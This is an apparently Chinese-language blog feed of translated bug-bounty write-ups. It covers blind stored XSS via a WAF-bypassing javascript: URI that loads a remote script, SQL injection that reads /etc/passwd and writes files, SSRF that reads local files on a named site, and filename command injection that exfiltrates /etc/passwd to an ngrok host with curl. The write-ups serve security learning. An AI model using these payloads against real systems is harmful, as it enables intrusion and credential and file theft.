<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>TimeS0ng&#39;s blog</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://TimeS0ng.github.io/"/>
  <updated>2019-02-15T03:25:49.000Z</updated>
  <id>http://TimeS0ng.github.io/</id>
  
  <author>
    <name>TimeS0ng</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>第十六篇：盲注XSS</title>
    <link href="http://TimeS0ng.github.io/2019/02/15/%E7%AC%AC%E5%8D%81%E5%85%AD%E7%AF%87%EF%BC%9A%E7%9B%B2%E6%B3%A8XSS/"/>
    <id>http://TimeS0ng.github.io/2019/02/15/第十六篇：盲注XSS/</id>
    <published>2019-02-15T02:42:19.000Z</published>
    <updated>2019-02-15T03:25:49.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="原文：Hack-Your-Form-–-New-vector-for-Blind-XSS"><a href="#原文：Hack-Your-Form-–-New-vector-for-Blind-XSS" class="headerlink" title="原文：Hack Your Form – New vector for Blind XSS"></a>原文：<a href="https://generaleg0x01.com/2019/01/13/hackyourform-bxss/" target="_blank" rel="external">Hack Your Form – New vector for Blind XSS</a></h4><h4 id="漏洞："><a href="#漏洞：" class="headerlink" title="漏洞："></a>漏洞：</h4><h4 id="作者：GeneralEG"><a href="#作者：GeneralEG" class="headerlink" title="作者：GeneralEG"></a>作者：<a href="https://generaleg0x01.com/author/GeneralEG/" target="_blank" rel="external">GeneralEG</a></h4><h4 id="难度：低"><a href="#难度：低" class="headerlink" title="难度：低"></a>难度：低</h4><a id="more"></a>
<h4 id="各位大佬们好，今天我要分享一个有趣的漏洞发现，关于如何绕过waf来执行javascript代码并且实现盲注存储型XSS。我在很多站点中都发现了这个问题，所以我决定以其中一个为例来讲解；"><a href="#各位大佬们好，今天我要分享一个有趣的漏洞发现，关于如何绕过waf来执行javascript代码并且实现盲注存储型XSS。我在很多站点中都发现了这个问题，所以我决定以其中一个为例来讲解；" class="headerlink" title="各位大佬们好，今天我要分享一个有趣的漏洞发现，关于如何绕过waf来执行javascript代码并且实现盲注存储型XSS。我在很多站点中都发现了这个问题，所以我决定以其中一个为例来讲解；"></a>各位大佬们好，今天我要分享一个有趣的漏洞发现，关于如何绕过waf来执行javascript代码并且实现盲注存储型XSS。我在很多站点中都发现了这个问题，所以我决定以其中一个为例来讲解；</h4><h4 id="我们暂时假设该域名为redacted-com，经过一些调查我发现该站点提供一个特定的服务（创建表格）。"><a href="#我们暂时假设该域名为redacted-com，经过一些调查我发现该站点提供一个特定的服务（创建表格）。" class="headerlink" title="我们暂时假设该域名为redacted.com，经过一些调查我发现该站点提供一个特定的服务（创建表格）。"></a>我们暂时假设该域名为redacted.com，经过一些调查我发现该站点提供一个特定的服务（创建表格）。</h4><h4 id="该服务是如何工作的呢？"><a href="#该服务是如何工作的呢？" class="headerlink" title="该服务是如何工作的呢？"></a>该服务是如何工作的呢？</h4><h4 id="1）用户创建表单"><a href="#1）用户创建表单" class="headerlink" title="1）用户创建表单"></a>1）用户创建表单</h4><h4 id="2）用户与访问者共享链接"><a href="#2）用户与访问者共享链接" class="headerlink" title="2）用户与访问者共享链接"></a>2）用户与访问者共享链接</h4><h4 id="3）访问者填写表格"><a href="#3）访问者填写表格" class="headerlink" title="3）访问者填写表格"></a>3）访问者填写表格</h4><h4 id="4）填写的信息将提交到-redacted-com-manager-Form-ID"><a href="#4）填写的信息将提交到-redacted-com-manager-Form-ID" class="headerlink" title="4）填写的信息将提交到 redacted.com/manager/{Form ID}/"></a>4）填写的信息将提交到 redacted.com/manager/{Form ID}/</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_16/1.jpg" alt=""></p>
<h4 id="表格创建好之后，我们使用访问者打开表格；"><a href="#表格创建好之后，我们使用访问者打开表格；" class="headerlink" title="表格创建好之后，我们使用访问者打开表格；"></a>表格创建好之后，我们使用访问者打开表格；</h4><h4 id="第一次实验时，我尝试用最原始的方法绕过它（website-com-”payload）我的payload是-https-example-com-quot-22-amp-34"><a href="#第一次实验时，我尝试用最原始的方法绕过它（website-com-”payload）我的payload是-https-example-com-quot-22-amp-34" class="headerlink" title="第一次实验时，我尝试用最原始的方法绕过它（website.com?”payload）我的payload是 https://example.com/?&quot;%22&amp;#34;"></a>第一次实验时，我尝试用最原始的方法绕过它（website.com?”payload）我的payload是 <a href="https://example.com/?&quot;%22&amp;#34" target="_blank" rel="external">https://example.com/?&quot;%22&amp;#34</a>;</h4><h4 id="然后用表单创建者打开看看发生了什么，很不幸的是过滤器编码了双引号，我们输入的数据变成了https-example-com-quot-22“"><a href="#然后用表单创建者打开看看发生了什么，很不幸的是过滤器编码了双引号，我们输入的数据变成了https-example-com-quot-22“" class="headerlink" title="然后用表单创建者打开看看发生了什么，很不幸的是过滤器编码了双引号，我们输入的数据变成了https://example.com/?&quot;%22“"></a>然后用表单创建者打开看看发生了什么，很不幸的是过滤器编码了双引号，我们输入的数据变成了<a href="https://example.com/?&quot;%22" target="_blank" rel="external">https://example.com/?&quot;%22</a>“</h4><h4 id="注意（标签）中呈现的链接"><a href="#注意（标签）中呈现的链接" class="headerlink" title="注意（标签）中呈现的链接"></a>注意（标签）中呈现的链接</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_16/2.jpg" alt=""></p>
<h4 id="接着我尝试采用Fuzzing测试，当尝试-test-https-example-com时过滤器接受了这种输入"><a href="#接着我尝试采用Fuzzing测试，当尝试-test-https-example-com时过滤器接受了这种输入" class="headerlink" title="接着我尝试采用Fuzzing测试，当尝试 test:https://example.com时过滤器接受了这种输入"></a>接着我尝试采用Fuzzing测试，当尝试 test:<a href="https://example.com时过滤器接受了这种输入" target="_blank" rel="external">https://example.com时过滤器接受了这种输入</a></h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_16/4.jpg" alt=""></p>
<h4 id="然后又开始尝试javascript-https-evil-com-同样的过滤器也没有过滤，现在我已经很确定这里存在XSS，但它需要真正的网站与我的payload结合使用才有效"><a href="#然后又开始尝试javascript-https-evil-com-同样的过滤器也没有过滤，现在我已经很确定这里存在XSS，但它需要真正的网站与我的payload结合使用才有效" class="headerlink" title="然后又开始尝试javascript:https://evil.com 同样的过滤器也没有过滤，现在我已经很确定这里存在XSS，但它需要真正的网站与我的payload结合使用才有效"></a>然后又开始尝试javascript:<a href="https://evil.com" target="_blank" rel="external">https://evil.com</a> 同样的过滤器也没有过滤，现在我已经很确定这里存在XSS，但它需要真正的网站与我的payload结合使用才有效</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_16/5.gif" alt=""></p>
<h4 id="所以我重新构造的payload是"><a href="#所以我重新构造的payload是" class="headerlink" title="所以我重新构造的payload是"></a>所以我重新构造的payload是</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">javascript:x=&apos;http://x.c&apos;;alert(&apos;xss&apos;);//</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_16/6.jpg" alt=""></p>
<h4 id="最后的最后，我们想要制作一个Blind-XSS来攻击真正的管理员，所以最终的payload是"><a href="#最后的最后，我们想要制作一个Blind-XSS来攻击真正的管理员，所以最终的payload是" class="headerlink" title="最后的最后，我们想要制作一个Blind XSS来攻击真正的管理员，所以最终的payload是"></a>最后的最后，我们想要制作一个Blind XSS来攻击真正的管理员，所以最终的payload是</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">javascript:eval(&apos;window.s=document.createElement(\&apos;script\&apos;);window.s.src=\&apos;//xsspt.com/SLEPOE\&apos;;document.body.appendChild(window.s)&apos;);s=&apos;https://s.com&apos;</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_16/7.jpg" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;原文：Hack-Your-Form-–-New-vector-for-Blind-XSS&quot;&gt;&lt;a href=&quot;#原文：Hack-Your-Form-–-New-vector-for-Blind-XSS&quot; class=&quot;headerlink&quot; title=&quot;原文：Hack Your Form – New vector for Blind XSS&quot;&gt;&lt;/a&gt;原文：&lt;a href=&quot;https://generaleg0x01.com/2019/01/13/hackyourform-bxss/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Hack Your Form – New vector for Blind XSS&lt;/a&gt;&lt;/h4&gt;&lt;h4 id=&quot;漏洞：&quot;&gt;&lt;a href=&quot;#漏洞：&quot; class=&quot;headerlink&quot; title=&quot;漏洞：&quot;&gt;&lt;/a&gt;漏洞：&lt;/h4&gt;&lt;h4 id=&quot;作者：GeneralEG&quot;&gt;&lt;a href=&quot;#作者：GeneralEG&quot; class=&quot;headerlink&quot; title=&quot;作者：GeneralEG&quot;&gt;&lt;/a&gt;作者：&lt;a href=&quot;https://generaleg0x01.com/author/GeneralEG/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;GeneralEG&lt;/a&gt;&lt;/h4&gt;&lt;h4 id=&quot;难度：低&quot;&gt;&lt;a href=&quot;#难度：低&quot; class=&quot;headerlink&quot; title=&quot;难度：低&quot;&gt;&lt;/a&gt;难度：低&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>第十五篇：SQL注入读取、写入文件</title>
    <link href="http://TimeS0ng.github.io/2019/02/14/%E7%AC%AC%E5%8D%81%E4%BA%94%E7%AF%87%EF%BC%9ASQL%E6%B3%A8%E5%85%A5%E8%AF%BB%E5%8F%96%E3%80%81%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6/"/>
    <id>http://TimeS0ng.github.io/2019/02/14/第十五篇：SQL注入读取、写入文件/</id>
    <published>2019-02-14T08:28:24.000Z</published>
    <updated>2019-02-14T08:58:15.641Z</updated>
    
    <content type="html"><![CDATA[<h4 id="原文：SQL-injection-with-load-file-and-into-outfile"><a href="#原文：SQL-injection-with-load-file-and-into-outfile" class="headerlink" title="原文：SQL injection with load file and into outfile"></a>原文：<a href="https://medium.com/bugbountywriteup/sql-injection-with-load-file-and-into-outfile-c62f7d92c4e2" target="_blank" rel="external">SQL injection with load file and into outfile</a></h4><h4 id="漏洞：SQL注入漏洞"><a href="#漏洞：SQL注入漏洞" class="headerlink" title="漏洞：SQL注入漏洞"></a>漏洞：SQL注入漏洞</h4><h4 id="作者：NoGe"><a href="#作者：NoGe" class="headerlink" title="作者：NoGe"></a>作者：<a href="https://medium.com/@p4c3n0g3" target="_blank" rel="external">NoGe</a></h4><h4 id="难度：低"><a href="#难度：低" class="headerlink" title="难度：低"></a>难度：低</h4><a id="more"></a>
<h4 id="我像往常一样注册网站会员"><a href="#我像往常一样注册网站会员" class="headerlink" title="我像往常一样注册网站会员"></a>我像往常一样注册网站会员</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_15/1.png" alt=""></p>
<h4 id="然后通过POST方法将表单信息发送到-https-www-blablabla-com-svc-form-affiliate。"><a href="#然后通过POST方法将表单信息发送到-https-www-blablabla-com-svc-form-affiliate。" class="headerlink" title="然后通过POST方法将表单信息发送到 https://www.blablabla.com/svc/*****/form_affiliate。"></a>然后通过POST方法将表单信息发送到 <a href="https://www.blablabla.com/svc/*****/form_affiliate。" target="_blank" rel="external">https://www.blablabla.com/svc/*****/form_affiliate。</a></h4><h4 id="这里的email参数存在SQL注入漏洞"><a href="#这里的email参数存在SQL注入漏洞" class="headerlink" title="这里的email参数存在SQL注入漏洞"></a>这里的email参数存在SQL注入漏洞</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_15/2.png" alt=""></p>
<h4 id="于是我在请求框-email-””-参数中插入SQL语句"><a href="#于是我在请求框-email-””-参数中插入SQL语句" class="headerlink" title="于是我在请求框 [email=””]参数中插入SQL语句"></a>于是我在请求框 [email=””]参数中插入SQL语句</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos; and 1=2 union all select concat_ws(0x3a,version(),user(),database())--+</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_15/3.png" alt=""></p>
<h4 id="结果在响应窗口显示-“5-5-41-log-root-10-130-0-1-tp-cart”。"><a href="#结果在响应窗口显示-“5-5-41-log-root-10-130-0-1-tp-cart”。" class="headerlink" title="结果在响应窗口显示 “5.5.41-log:root@10.130.0.1:tp_cart”。"></a>结果在响应窗口显示 “5.5.41-log:root@10.130.0.1:tp_cart”。</h4><h4 id="现在我尝试使用SQL命令来读取文件"><a href="#现在我尝试使用SQL命令来读取文件" class="headerlink" title="现在我尝试使用SQL命令来读取文件"></a>现在我尝试使用SQL命令来读取文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos; and 1=2 union all select load_file(&apos;/etc/passwd&apos;)--+</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_15/4.png" alt=""></p>
<h4 id="接着尝试在-tmp目录写入文件"><a href="#接着尝试在-tmp目录写入文件" class="headerlink" title="接着尝试在/tmp目录写入文件"></a>接着尝试在/tmp目录写入文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos; and 1=2 union all select &apos;blablalba_bug_bounty_program&apos; into outfile &apos;/tmp/blablabla&apos;--+</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_15/5.png" alt=""></p>
<h4 id="最后我们看看文件是否成功写入"><a href="#最后我们看看文件是否成功写入" class="headerlink" title="最后我们看看文件是否成功写入"></a>最后我们看看文件是否成功写入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&apos; and 1=2 union all select load_file(&apos;/tmp/blablabla&apos;)--+</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_15/6.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;原文：SQL-injection-with-load-file-and-into-outfile&quot;&gt;&lt;a href=&quot;#原文：SQL-injection-with-load-file-and-into-outfile&quot; class=&quot;headerlink&quot; title=&quot;原文：SQL injection with load file and into outfile&quot;&gt;&lt;/a&gt;原文：&lt;a href=&quot;https://medium.com/bugbountywriteup/sql-injection-with-load-file-and-into-outfile-c62f7d92c4e2&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;SQL injection with load file and into outfile&lt;/a&gt;&lt;/h4&gt;&lt;h4 id=&quot;漏洞：SQL注入漏洞&quot;&gt;&lt;a href=&quot;#漏洞：SQL注入漏洞&quot; class=&quot;headerlink&quot; title=&quot;漏洞：SQL注入漏洞&quot;&gt;&lt;/a&gt;漏洞：SQL注入漏洞&lt;/h4&gt;&lt;h4 id=&quot;作者：NoGe&quot;&gt;&lt;a href=&quot;#作者：NoGe&quot; class=&quot;headerlink&quot; title=&quot;作者：NoGe&quot;&gt;&lt;/a&gt;作者：&lt;a href=&quot;https://medium.com/@p4c3n0g3&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;NoGe&lt;/a&gt;&lt;/h4&gt;&lt;h4 id=&quot;难度：低&quot;&gt;&lt;a href=&quot;#难度：低&quot; class=&quot;headerlink&quot; title=&quot;难度：低&quot;&gt;&lt;/a&gt;难度：低&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>第十四篇：SSRF读取本地文件</title>
    <link href="http://TimeS0ng.github.io/2019/02/14/%E7%AC%AC%E5%8D%81%E5%9B%9B%E7%AF%87%EF%BC%9ASSRF%E8%AF%BB%E5%8F%96%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6/"/>
    <id>http://TimeS0ng.github.io/2019/02/14/第十四篇：SSRF读取本地文件/</id>
    <published>2019-02-14T03:05:16.000Z</published>
    <updated>2019-02-14T03:30:11.522Z</updated>
    
    <content type="html"><![CDATA[<h4 id="原文：Server-Side-Request-Forgery-SSRF-Testing"><a href="#原文：Server-Side-Request-Forgery-SSRF-Testing" class="headerlink" title="原文：Server Side Request Forgery(SSRF) Testing"></a>原文：<a href="https://medium.com/bugbountywriteup/command-injection-poc-72cc3743f10d" target="_blank" rel="external"><em>Server Side Request Forgery</em>(<em>SSRF</em>) Testing</a></h4><h4 id="漏洞：SSRF漏洞"><a href="#漏洞：SSRF漏洞" class="headerlink" title="漏洞：SSRF漏洞"></a>漏洞：SSRF漏洞</h4><h4 id="作者：NoGe"><a href="#作者：NoGe" class="headerlink" title="作者：NoGe"></a>作者：<a href="https://medium.com/@p4c3n0g3" target="_blank" rel="external">NoGe</a></h4><h4 id="难度：低"><a href="#难度：低" class="headerlink" title="难度：低"></a>难度：低</h4><a id="more"></a>
<h4 id="我发现一个存在SSRF的随机web网站，为了利用它我应该将输入数据编码为base64格式，下面是正常的URL，这会将我们定位到我们提供的url地址上面去"><a href="#我发现一个存在SSRF的随机web网站，为了利用它我应该将输入数据编码为base64格式，下面是正常的URL，这会将我们定位到我们提供的url地址上面去" class="headerlink" title="我发现一个存在SSRF的随机web网站，为了利用它我应该将输入数据编码为base64格式，下面是正常的URL，这会将我们定位到我们提供的url地址上面去"></a>我发现一个存在SSRF的随机web网站，为了利用它我应该将输入数据编码为base64格式，下面是正常的URL，这会将我们定位到我们提供的url地址上面去</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://playfreedownloadgames.com:2483/proxy.php?url=aHR0cDovL3d3dy50b3A4MHNnYW1lcy5jb20vc2l0ZS9jb250ZW50L3BhY21hbg==</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_14/1.png" alt=""></p>
<h4 id="所以让我们尝试编码http-127-0-0-1-80，并将它传给url参数aHR0cDovLzEyNy4wLjAuMTo4MA"><a href="#所以让我们尝试编码http-127-0-0-1-80，并将它传给url参数aHR0cDovLzEyNy4wLjAuMTo4MA" class="headerlink" title="所以让我们尝试编码http://127.0.0.1:80，并将它传给url参数aHR0cDovLzEyNy4wLjAuMTo4MA=="></a>所以让我们尝试编码<a href="http://127.0.0.1:80，并将它传给url参数aHR0cDovLzEyNy4wLjAuMTo4MA==" target="_blank" rel="external">http://127.0.0.1:80，并将它传给url参数aHR0cDovLzEyNy4wLjAuMTo4MA==</a></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://playfreedownloadgames.com:2483/proxy.php?url=aHR0cDovLzEyNy4wLjAuMTo4MA==</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_14/2.png" alt=""></p>
<h4 id="尝试一下443端口"><a href="#尝试一下443端口" class="headerlink" title="尝试一下443端口"></a>尝试一下443端口</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_14/3.png" alt=""></p>
<h4 id="出现Bad-Request响应是因为我们使用HTTP但是使用了443端口。现在我们继续尝试gopher、dict和sftp。我将在我的VPS中监听1337端口"><a href="#出现Bad-Request响应是因为我们使用HTTP但是使用了443端口。现在我们继续尝试gopher、dict和sftp。我将在我的VPS中监听1337端口" class="headerlink" title="出现Bad Request响应是因为我们使用HTTP但是使用了443端口。现在我们继续尝试gopher、dict和sftp。我将在我的VPS中监听1337端口"></a>出现Bad Request响应是因为我们使用HTTP但是使用了443端口。现在我们继续尝试gopher、dict和sftp。我将在我的VPS中监听1337端口</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">gopher://my_vps_ip:1337/_pacenoge</div><div class="line">dict://my_vps_ip:1337</div><div class="line"> sftp://my_vps_ip:1337</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_14/4.png" alt=""></p>
<h4 id="可以看到上述请求都成功了。但还有什么我们没有尝试呢？对了，是file-etc-passwd"><a href="#可以看到上述请求都成功了。但还有什么我们没有尝试呢？对了，是file-etc-passwd" class="headerlink" title="可以看到上述请求都成功了。但还有什么我们没有尝试呢？对了，是file:///etc/passwd"></a>可以看到上述请求都成功了。但还有什么我们没有尝试呢？对了，是file:///etc/passwd</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">file:///etc/passwd</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_14/5.png" alt=""></p>
<h4 id="接着我想看看httpd-conf"><a href="#接着我想看看httpd-conf" class="headerlink" title="接着我想看看httpd.conf"></a>接着我想看看httpd.conf</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">file:///etc/httpd/conf/httpd.conf</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_14/6.png" alt=""></p>
<h4 id="通过阅读httpd-conf文件我知道了web服务的根目录-home-playfreedownloadgames-public-html-所以我可以读取proxy-php的文件内容"><a href="#通过阅读httpd-conf文件我知道了web服务的根目录-home-playfreedownloadgames-public-html-所以我可以读取proxy-php的文件内容" class="headerlink" title="通过阅读httpd.conf文件我知道了web服务的根目录/home/playfreedownloadgames/public_html 所以我可以读取proxy.php的文件内容"></a>通过阅读httpd.conf文件我知道了web服务的根目录/home/playfreedownloadgames/public_html 所以我可以读取proxy.php的文件内容</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">file:////home/playfreedownloadgames/public_html/proxy.php</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_14/7.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;原文：Server-Side-Request-Forgery-SSRF-Testing&quot;&gt;&lt;a href=&quot;#原文：Server-Side-Request-Forgery-SSRF-Testing&quot; class=&quot;headerlink&quot; title=&quot;原文：Server Side Request Forgery(SSRF) Testing&quot;&gt;&lt;/a&gt;原文：&lt;a href=&quot;https://medium.com/bugbountywriteup/command-injection-poc-72cc3743f10d&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;em&gt;Server Side Request Forgery&lt;/em&gt;(&lt;em&gt;SSRF&lt;/em&gt;) Testing&lt;/a&gt;&lt;/h4&gt;&lt;h4 id=&quot;漏洞：SSRF漏洞&quot;&gt;&lt;a href=&quot;#漏洞：SSRF漏洞&quot; class=&quot;headerlink&quot; title=&quot;漏洞：SSRF漏洞&quot;&gt;&lt;/a&gt;漏洞：SSRF漏洞&lt;/h4&gt;&lt;h4 id=&quot;作者：NoGe&quot;&gt;&lt;a href=&quot;#作者：NoGe&quot; class=&quot;headerlink&quot; title=&quot;作者：NoGe&quot;&gt;&lt;/a&gt;作者：&lt;a href=&quot;https://medium.com/@p4c3n0g3&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;NoGe&lt;/a&gt;&lt;/h4&gt;&lt;h4 id=&quot;难度：低&quot;&gt;&lt;a href=&quot;#难度：低&quot; class=&quot;headerlink&quot; title=&quot;难度：低&quot;&gt;&lt;/a&gt;难度：低&lt;/h4&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>第十三篇：命令执行</title>
    <link href="http://TimeS0ng.github.io/2019/02/14/%E7%AC%AC%E5%8D%81%E4%B8%89%E7%AF%87%EF%BC%9A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <id>http://TimeS0ng.github.io/2019/02/14/第十三篇：命令执行/</id>
    <published>2019-02-14T02:19:44.000Z</published>
    <updated>2019-02-14T02:52:08.637Z</updated>
    
    <content type="html"><![CDATA[<h4 id="原文：Command-Injection-PoC"><a href="#原文：Command-Injection-PoC" class="headerlink" title="原文：Command Injection PoC"></a>原文：<a href="https://medium.com/bugbountywriteup/command-injection-poc-72cc3743f10d" target="_blank" rel="external">Command Injection PoC</a></h4><h4 id="漏洞：文件名导致RCE"><a href="#漏洞：文件名导致RCE" class="headerlink" title="漏洞：文件名导致RCE"></a>漏洞：文件名导致RCE</h4><h4 id="作者：NoGe"><a href="#作者：NoGe" class="headerlink" title="作者：NoGe"></a>作者：<a href="https://medium.com/@p4c3n0g3" target="_blank" rel="external">NoGe</a></h4><h4 id="难度：中"><a href="#难度：中" class="headerlink" title="难度：中"></a>难度：中</h4><a id="more"></a>
<h4 id="我在某个招聘网站发现了一个命令注入漏洞，很有趣的是它的注入参数居然是文件名，下面是漏洞复现过程！"><a href="#我在某个招聘网站发现了一个命令注入漏洞，很有趣的是它的注入参数居然是文件名，下面是漏洞复现过程！" class="headerlink" title="我在某个招聘网站发现了一个命令注入漏洞，很有趣的是它的注入参数居然是文件名，下面是漏洞复现过程！"></a>我在某个招聘网站发现了一个命令注入漏洞，很有趣的是它的注入参数居然是文件名，下面是漏洞复现过程！</h4><h4 id="首先我用命令”sleep-5”来对参数进行测试，发现响应延迟了5-6秒"><a href="#首先我用命令”sleep-5”来对参数进行测试，发现响应延迟了5-6秒" class="headerlink" title="首先我用命令”sleep 5”来对参数进行测试，发现响应延迟了5-6秒"></a>首先我用命令”sleep 5”来对参数进行测试，发现响应延迟了5-6秒</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_13/1.png" alt=""></p>
<h4 id="我再次用命令”sleep-10”来进行验证，发现响应延迟了10-11秒，这让我确信这里确实存在漏洞"><a href="#我再次用命令”sleep-10”来进行验证，发现响应延迟了10-11秒，这让我确信这里确实存在漏洞" class="headerlink" title="我再次用命令”sleep 10”来进行验证，发现响应延迟了10-11秒，这让我确信这里确实存在漏洞"></a>我再次用命令”sleep 10”来进行验证，发现响应延迟了10-11秒，这让我确信这里确实存在漏洞</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_13/2.png" alt=""></p>
<h4 id="接着我尝试去ping我的服务器”ping-c-5-lt-VPS-IP-gt-”，并在服务器上运行”tcpdump-i-lt-interface-gt-n-icmp”进行抓包"><a href="#接着我尝试去ping我的服务器”ping-c-5-lt-VPS-IP-gt-”，并在服务器上运行”tcpdump-i-lt-interface-gt-n-icmp”进行抓包" class="headerlink" title="接着我尝试去ping我的服务器”ping -c 5 &lt; VPS IP &gt;”，并在服务器上运行”tcpdump -i &lt; interface &gt; -n icmp”进行抓包"></a>接着我尝试去ping我的服务器”ping -c 5 &lt; VPS IP &gt;”，并在服务器上运行”tcpdump -i &lt; interface &gt; -n icmp”进行抓包</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_13/3.png" alt=""></p>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_13/4.png" alt=""></p>
<h4 id="下面我在VPS上用ngrok搭建web服务”-ngrok-http-80”，然后在客户端文件名参数上执行”curl-blablabla-ngrok-io”"><a href="#下面我在VPS上用ngrok搭建web服务”-ngrok-http-80”，然后在客户端文件名参数上执行”curl-blablabla-ngrok-io”" class="headerlink" title="下面我在VPS上用ngrok搭建web服务”./ngrok http 80”，然后在客户端文件名参数上执行”curl blablabla.ngrok.io”"></a>下面我在VPS上用ngrok搭建web服务”./ngrok http 80”，然后在客户端文件名参数上执行”curl blablabla.ngrok.io”</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_13/5.png" alt=""></p>
<h4 id="现在看看ngrok-web界面的响应，我收到来自IP地址000-000-39-169的request请求，这和上面的ICMP请求IP一致"><a href="#现在看看ngrok-web界面的响应，我收到来自IP地址000-000-39-169的request请求，这和上面的ICMP请求IP一致" class="headerlink" title="现在看看ngrok web界面的响应，我收到来自IP地址000.000.39.169的request请求，这和上面的ICMP请求IP一致"></a>现在看看ngrok web界面的响应，我收到来自IP地址000.000.39.169的request请求，这和上面的ICMP请求IP一致</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_13/6.png" alt=""></p>
<h4 id="现在我可以使用命令”curl-F-shl-etc-passwd-blabla-ngrok-io”来读取服务器上的文件并发送到我的ngrok地址。"><a href="#现在我可以使用命令”curl-F-shl-etc-passwd-blabla-ngrok-io”来读取服务器上的文件并发送到我的ngrok地址。" class="headerlink" title="现在我可以使用命令”curl -F shl=@/etc/passwd blabla.ngrok.io”来读取服务器上的文件并发送到我的ngrok地址。"></a>现在我可以使用命令”curl -F shl=@/etc/passwd blabla.ngrok.io”来读取服务器上的文件并发送到我的ngrok地址。</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl -F shl=@/etc/passwd blabla.ngrok.io</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_13/7.png" alt=""></p>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_13/8.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
